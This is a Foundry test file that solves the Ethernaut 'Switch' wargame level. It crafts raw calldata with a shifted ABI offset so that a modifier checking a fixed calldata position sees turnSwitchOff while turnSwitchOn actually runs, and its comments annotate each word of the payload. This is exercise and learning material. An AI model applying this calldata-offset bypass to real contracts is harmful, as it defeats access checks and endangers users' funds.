// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Switch.sol";

contract SwitchTest is Test {
    Switch instance;

    function setUp() public {
        instance = new Switch();
    }

    function test() public {
        assertEq(instance.switchOn(), false);

        // 30c13ade: flipSwitch selector
        // 0000000000000000000000000000000000000000000000000000000000000060: 3*32 bytes (hence 0x60) offset, including this offset specifier and the following two 32 bytes set
        // 0000000000000000000000000000000000000000000000000000000000000004: make it 4 to be the usual length of the following data
        // tho in this case, these 32 bytes can be anything as long as the next 4 bytes are the selector of turnSwitchOff as specified in onlyOff
        // 20606e1500000000000000000000000000000000000000000000000000000000: turnSwitchOff selector

        // since we specify there's a 3*32 bytes offset, the function knows to parse the following data as its input _data
        // 0000000000000000000000000000000000000000000000000000000000000004: data length, which is 4
        // 76227e1200000000000000000000000000000000000000000000000000000000: turnSwitchOn selector
        bytes memory param =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        address(instance).call(param);
        assertEq(instance.switchOn(), true);
    }
}
